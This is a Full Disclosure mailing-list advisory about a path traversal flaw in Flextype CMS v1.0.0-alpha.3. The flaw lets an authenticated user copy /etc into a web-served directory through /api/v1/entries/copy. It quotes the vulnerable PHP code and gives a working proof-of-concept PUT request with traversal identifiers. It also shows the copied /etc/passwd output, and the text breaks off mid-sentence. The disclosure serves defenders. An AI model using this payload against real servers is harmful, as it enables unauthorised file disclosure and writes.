---
title: Flextype v1.0.0-alpha.3 Path Traversal in Entry Copy Allows Arbitrary Directory Copy and File Disclosure
url: https://seclists.org/fulldisclosure/2026/Sep/22
source: Full Disclosure
date: 2026-09-04
fetch_date: 2026-09-05T06:30:32.951763
---

# Flextype v1.0.0-alpha.3 Path Traversal in Entry Copy Allows Arbitrary Directory Copy and File Disclosure

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](21)
[By Date](date.html#22)
[![Next](/images/right-icon-16x16.png)](23)

[![Previous](/images/left-icon-16x16.png)](21)
[By Thread](index.html#22)
[![Next](/images/right-icon-16x16.png)](23)

![](/shared/images/nst-icons.svg#search)

# Flextype v1.0.0-alpha.3 Path Traversal in Entry Copy Allows Arbitrary Directory Copy and File Disclosure

---

*From*: Ron E <ronaldjedgerson () gmail com>
*Date*: Sun, 30 Aug 2026 22:22:38 -0400

---

```
Description

Flextype CMS v1.0.0-alpha.3 contains a path traversal vulnerability in the
Entries copy functionality. An authenticated remote attacker can supply
directory traversal sequences within both the source id and destination
new_id parameters submitted to /api/v1/entries/copy.

Flextype constructs entry directory paths by directly concatenating the
supplied entry identifier with the configured entries directory without
sufficiently canonicalizing the resulting path or verifying that it remains
within the intended project/entries directory.

As a result, an attacker can escape the configured entries directory for
both the source and destination of a copy operation. Testing confirmed that
a source identifier containing ../../../etc resolved to the system /etc
directory and that a destination identifier containing ../../etc-copy
caused the directory to be copied outside project/entries to /app/etc-copy.

The copied /etc/passwd file was subsequently accessible over HTTP from
/etc-copy/passwd, resulting in disclosure of operating-system files that
were not intended to be exposed by the web application.
Impact

Successful exploitation allows an authenticated remote attacker to escape
the Flextype entries directory and use filesystem directories outside the
intended content storage location as the source or destination of entry
copy operations.

Testing demonstrated that the vulnerability can copy operating-system files
from /etc into a web-accessible location under the application root. This
resulted in remote disclosure of /etc/passwd.

Depending on filesystem permissions, application deployment layout, and
web-server configuration, the vulnerability may allow disclosure of
sensitive application and operating-system files by copying otherwise
inaccessible directories into web-accessible locations.

The destination traversal also provides a filesystem write/copy primitive
outside the intended project/entries security boundary. This primitive may
increase the impact of other vulnerabilities when chained with
functionality capable of interpreting or executing attacker-controlled
files.
DetailsVulnerable Entry Copy Implementation

The Flextype copy() method receives the existing entry identifier and new
entry identifier and eventually passes both values to getDirectoryLocation()
:

public function copy(string $id, string $newID): bool
{
    // Collections validation helper.
    // Check if collections are identical.
    $isValidCollections = function ($id, $newID) {
        $collectionForCurrentEntry = $this->getCollectionOptions($id);
        $collectionForNewEntry     = $this->getCollectionOptions($newID);

        $result = true;

        if (! isset($collectionForCurrentEntry['filename']) ||
            ! isset($collectionForCurrentEntry['extension']) ||
            ! isset($collectionForCurrentEntry['serializer']) ||
            ! isset($collectionForNewEntry['filename']) ||
            ! isset($collectionForNewEntry['extension']) ||
            ! isset($collectionForNewEntry['serializer'])) {
            $result = false;
        }

        if (($collectionForCurrentEntry['filename'] !=
$collectionForNewEntry['filename']) ||
            ($collectionForCurrentEntry['extension'] !=
$collectionForNewEntry['extension']) ||
            ($collectionForCurrentEntry['serializer'] !=
$collectionForNewEntry['serializer'])) {
            $result = false;
        }

        return $result;
    };

    if (! $isValidCollections($id, $newID)) {
        return false;
    }

    $this->registry()->set('methods.copy', [
        'collection' => $this->getCollectionOptions($id),
        'params' => [
            'id' => $id,
            'newID' => $newID,
        ],
        'result' => null,
    ]);

    emitter()->emit('onEntriesCopy');

    if (! is_null($this->registry()->get('methods.copy.result')) &&
        is_bool($this->registry()->get('methods.copy.result'))) {
        return $this->registry()->get('methods.copy.result');
    }

    return filesystem()
        ->directory($this->getDirectoryLocation($this->registry()->get('methods.copy.params.id')))
        ->copy($this->getDirectoryLocation($this->registry()->get('methods.copy.params.newID')));
}

The getDirectoryLocation() method constructs the filesystem path using the
supplied identifier:

public function getDirectoryLocation(string $id): string
{
    $this->registry()->set('methods.getDirectoryLocation', [
        'collection' => $this->getCollectionOptions($id),
        'params' => [
            'id' => $id,
        ],
        'result' => null,
    ]);

    emitter()->emit('onEntriesGetDirectoryLocation');

    if (! is_null($this->registry()->get('methods.getDirectoryLocation.result'))
&&
        is_string($this->registry()->get('methods.getDirectoryLocation.result')))
{
        return $this->registry()->get('methods.getDirectoryLocation.result');
    }

    return FLEXTYPE_PATH_PROJECT . '/' .
           $this->options['directory'] . '/' .
           $this->registry()->get('methods.getDirectoryLocation.params.id');
}

The supplied identifier is appended directly to:

FLEXTYPE_PATH_PROJECT/<entries-directory>/

without enforcing that the canonicalized resulting path remains beneath the
intended entries directory.

Consequently, traversal sequences within an entry identifier can escape the
expected directory.
Proof of Concept — Escape Source and Destination Directories

The following request supplies traversal sequences for both the source and
destination identifiers:

PUT /api/v1/entries/copy HTTP/1.1
Host: 127.0.0.1:18080
Content-Type: application/json

{"token":"lab-token","access_token":"password","id":"../../../etc","new_id":"../../etc-copy"}

Given an entries directory rooted at:

/app/project/entries

the source:

../../../etc

escapes the entries directory and resolves to:

/etc

The destination:

../../etc-copy

similarly escapes the entries directory and resolves to:

/app/etc-copy

The HTTP endpoint returned:

HTTP/1.1 404 Not Found
Host: 127.0.0.1:18080
Date: Mon, 31 Aug 2026 02:17:02 GMT
Connection: close
X-Powered-By: PHP/8.1.34
Set-Cookie: Flextype=c6044093f63329175869143209974d1c; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Type: application/json;charset=UTF-8
Content-Length: 0
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: X-Requested-With, Content-Type, Accept,
Origin, Authorization
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH, OPTIONS
Access-Control-Allow-Expose:
Access-Control-Allow-Credentials: false

Despite the HTTP 404 response, filesystem inspection confirmed that the
copy operation occurred.
Proof of Concept — Filesystem Evidence

Following the request, /etc/passwd existed beneath the attacker-selected
escaped destination:

realpath: /app/etc-copy/passwd
---
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
--snip--

The resulting path:

/app/etc...